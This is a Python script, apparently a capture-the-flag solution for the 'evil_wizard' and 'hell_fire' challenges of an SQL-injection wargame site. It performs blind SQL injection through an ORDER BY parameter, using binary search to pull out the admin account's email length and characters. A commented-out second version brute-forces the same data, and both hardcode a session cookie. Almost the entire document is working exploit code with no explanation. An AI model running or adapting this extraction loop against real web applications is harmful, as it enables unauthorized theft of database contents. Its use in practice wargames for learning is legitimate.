
import requests
url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
cookie = {'PHPSESSID': 'i8o306fnotmd2eg2gvuqht7h78'}


def check(data):
    return "<th>score</th><tr><td>admin</td><td>**************</td>" in data


ok = 0
ng = 60
first = 1

while ok + 1 != ng:
    md = (ok + ng) // 2
    q = f"if(id='admin' and length(email) >= {md} ,substr(id,1,1), substr(id,3,1))"
    res = requests.get(url, params={'order': q}, cookies=cookie)
    print(f"[+] try {md}")
    if first:
        print(res.text)
        first = 0
    if check(res.text):
        ok = md
    else:
        ng = md

length = ok
print(f"[*] length = {length}")

ans = ""
for i in range(0, length):
    ok = 0
    ng = 256

    while ok + 1 != ng:
        md = (ok + ng) // 2
        q = f"if(id='admin' and {md} <= ascii(substr(email,{i+1},1)),substr(id,1,1), substr(id,3,1))"
        res = requests.get(url, params={'order': q}, cookies=cookie)
        print(f"[+] try {md}")
        if check(res.text):
            ok = md
        else:
            ng = md

    ans += str(chr(ok))
    print(f"[*] {ans}")

print(f"[*] find! {ans}")


#!/usr/bin/env python3
# -*- coding:utf-8 -*-

# import os
# import requests
# import urllib.parse
# from bs4 import BeautifulSoup

# url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"
# cookie = {'PHPSESSID': 'i8o306fnotmd2eg2gvuqht7h78'}

# # headers = {'Cookie': 'PHPSESSID='+cookie}
# candidates = [chr(i) for i in range(48, 48+10)] + \
#     [chr(i) for i in range(97, 97+26)] + \
#     [chr(i) for i in range(65, 65+26)] + \
#     ["_", "@", ".", "$", "!", "?", "&", "#"]


# def attack(attack_sql):
#     attack_url = url + '?order=' + urllib.parse.quote(attack_sql)
#     # print(attack_url)
#     res = requests.get(attack_url, cookies=cookie)
#     # print(res.text)
#     return res


# def create_pass_query(try_mail):
#     query = "if((id='admin' and ord(substr(email," + str(len(try_mail)
#                                                          ) + ",1))='" + str(ord(try_mail[-1])) + "'), 1,3)"
#     return query


# def check_result(res):
#     soup = BeautifulSoup(res.text, 'html.parser')
#     table = soup.find('table')
#     rows = table.findAll('tr')
#     if 'admin' in str(rows[1]):
#         return True
#     return False

# ####################
# ###     main     ###
# ####################


# # find email
# fixed = ""
# is_end = False
# while not is_end:
#     for c in candidates:
#         try_mail = fixed + str(c)
#         print(try_mail)
#         query = create_pass_query(try_mail)
#         res = attack(query)
#         if check_result(res):
#             fixed += c
#             break
#         if c == '#':
#             is_end = True

# print("result: " + fixed)
